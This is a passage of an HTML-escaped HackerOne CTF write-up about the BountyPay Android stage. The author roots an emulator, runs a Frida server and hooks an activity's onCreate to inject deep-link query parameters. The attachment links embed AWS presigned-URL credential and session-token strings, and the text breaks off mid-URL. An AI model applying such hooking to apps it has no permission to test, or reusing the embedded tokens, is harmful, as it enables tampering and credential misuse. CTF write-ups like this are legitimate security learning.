uj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=778d1d85324ae5eaa4904625b268b9eedd00161505c18ed8b7961e5c006090ae\" data-attachment-type=\"text/x-java\"\u003ePartTwoActivity.java (F859858)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"PartThreeActivity.java\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UUDQcXGt4LrNiSNjNzcGhrxf?response-content-disposition=attachment%3B%20filename%3D%22PartThreeActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartThreeActivity.java\u0026amp;response-content-type=text%2Fx-java\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=ac57be5e677eba95f51abceff022cb31c8a8e8e92f134d1e21981e8e187bb3a3\" data-attachment-type=\"text/x-java\"\u003ePartThreeActivity.java (F859857)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI don\u0026#39;t see anything that looks like a token, and decide I will need to actually run the app.\u003c/p\u003e\n\n\u003ch2 id=\"running-the-app\"\u003eRunning the app\u003c/h2\u003e\n\n\u003cp\u003eI have an iPhone, so I download \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.android.com%2Fstudio\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eAndroid Studio\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for this.\u003c/p\u003e\n\n\u003cp\u003eIn Android studio, I create a new empty application, and then open the \u0026#39;Android Virtual Device Manager\u0026#39; and create a Pixel XL device with Android R. Afterwards, right click the device and do \u0026#39;Cold Boot Now\u0026#39;. Then drag and drop the apk onto the virtual device to install it.\u003c/p\u003e\n\n\u003cp\u003eThe first screen asks for a username, and when you click next you are dropped on an empty screen. There is a button in the corner that, when clicked, provides very helpful hints: \u0026#39;Deep links\u0026#39; and \u0026#39;Params\u0026#39;. I don\u0026#39;t know what this means, and decide that dynamic analysis will be needed.\u003c/p\u003e\n\n\u003ch2 id=\"dynamic-analysis\"\u003eDynamic analysis\u003c/h2\u003e\n\n\u003cp\u003eI installed \u003ca href=\"/redirect?url=https%3A%2F%2Ffrida.re%2Fdocs%2Finstallation%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFrida\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in my \u003ca href=\"/redirect?url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwsl%2Finstall-win10\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eWSL Ubuntu\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, which I frequently use for python stuff. Then, using the Terminal built into Android Studio, I rooted the emulator and installed the Frida server on the it following the directions \u003ca href=\"/redirect?url=https%3A%2F%2Ffrida.re%2Fdocs%2Fandroid%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e .\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe root\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe push C:\\Users\\Nick\\workspace\\hackeronectf\\frida-server-12.9.4-android-x86 /data/local/tmp/\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe shell \u0026quot;chmod 755 /data/local/tmp/frida-server-12.9.4-android-x86\u0026quot;\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe shell \u0026quot;/data/local/tmp/frida-server-12.9.4-android-x86 \u0026amp;\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eGreat. Now that I have the tools installed, how does Android hacking work?\u003c/p\u003e\n\n\u003cp\u003eThe \u003ca href=\"/redirect?url=https%3A%2F%2Ffrida.re%2Fdocs%2Fexamples%2Fandroid%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFrida Android example page\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e shows how to hook the onClick handler of a button. Looking back at the source for the three source files for BountyPay, they seem to all have a similar structure.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonCreate\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eBundle\u003c/span\u003e \u003cspan class=\"n\"\u003esavedInstanceState\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"c1\"\u003e// ... stuff\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// show boxes based on values of query parameters that are part of this \u0026#39;intent\u0026#39; thing.\u003c/span\u003e\n    \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;start\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\n  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo it looks like all we have to do is hook onCreate and set the query parameters before calling the original onCreate.\u003c/p\u003e\n\n\u003ch2 id=\"activities\"\u003eActivities\u003c/h2\u003e\n\n\u003ch3 id=\"partoneactivity\"\u003ePartOneActivity\u003c/h3\u003e\n\n\u003cp\u003eSource: \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"PartOneActivity.java\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sjC7HydKe68xJRniy7M2VJHo?response-content-disposition=attachment%3B%20filename%3D%22PartOneActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartOneActivity.java\u0026amp;response-content-type=text%2Fx-java\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=5659ae6a043077d1c47afe856e90702ddc0d17dec34d58b1184bf8413909144e\" data-attachment-type=\"text/x-java\"\u003ePartOneActivity.java (F859859)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI throw this together in a script file:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eJava\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eperform\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n  \u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eperform\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"c1\"\u003e// Function to hook is defined here\u003c/span\u003e\n\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ePartOneActivity\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eJava\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ebounty.pay.PartOneActivity\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ejavaUri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eJava\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eandroid.net.Uri\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e// Whenever button is clicked\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eonCreate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ePartOneActivity\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonCreate\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eonCreate\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eimplementation\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esavedInstanceState\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// Show a message to know that the function got called\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eonCreate\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003egotintent\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eintentData\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ejavaUri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003econtent://asdf/?start=PartTwoActivity\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"nx\"\u003esetData\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eintentData\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// Call the original onCreate handler\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eonCreate\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003esavedInstanceState\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand in my WSL Ubuntu terminal run it\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003efrida \u003cspan class=\"nt\"\u003e-U\u003c/span\u003e \u003cspan class=\"nt\"\u003e-l\u003c/span\u003e runme.js bounty.pay\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAccording to the terminal output, only the \u0026#39;perform\u0026#39; part happened. After some Googling, I find a \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ffrida%2Ffrida%2Fissues%2F480%23issuecomment-441453427\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGitHub issue comment\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that explains that in order to hook onCreate we need our stuff to run before the app starts.\u003c/p\u003e\n\n\u003cp\u003eI borrow the code from that comment and put my javascript in it.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"ctf_part1.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QuZWtinRL3nHdvWBjE9yYYrL?response-content-disposition=attachment%3B%20filename%3D%22ctf_part1.py%22%3B%20filename%2A%3DUTF-8%27%27ctf_part1.py\u0026amp;response-content-type=text%2Fplain\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=cc34fe6377ff370b2712028544c6e7fe6b9203eb4420c9f06b0636eab972c761\" data-attachment-type=\"text/plain\"\u003ectf_part1.py (F859851)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI then kill the app on the emulator and run the python script with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003epython3 ctf_part1.py\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt works, and we\u0026#39;re on to part two.\u003c/p\u003e\n\n\u003ch3 id=\"parttwoactivity\"\u003ePartTwoActivity\u003c/h3\u003e\n\n\u003cp\u003eSource: \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"PartTwoActivity.java\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/omvKHAQdg6T2947xedpyTg5S?response-content-disposition=attachment%3B%20filename%3D%22PartTwoActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartTwoActivity.java\u0026amp;response-content-type=text%2Fx-java\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=778d1d85324ae5eaa4904625b268b9eedd00161505c18ed8b7961e5c006090ae\" data-attachment-type=\"text/x-java\"\u003ePartTwoActivity.java (F859858)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eReading the code, it\u0026#39;s very similar to part one, and I update the Frida script accordingly.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"ctf_part2.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fZADTsJfEfdmEP1Phd94S2DS?response-content-disposition=attachment%3B%20filename%3D%22ctf_part2.py%22%3B%20filename%2A%3DUTF-8%27%27ctf_part2.py\u0026amp;response-content-type=text%2Fplain\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqV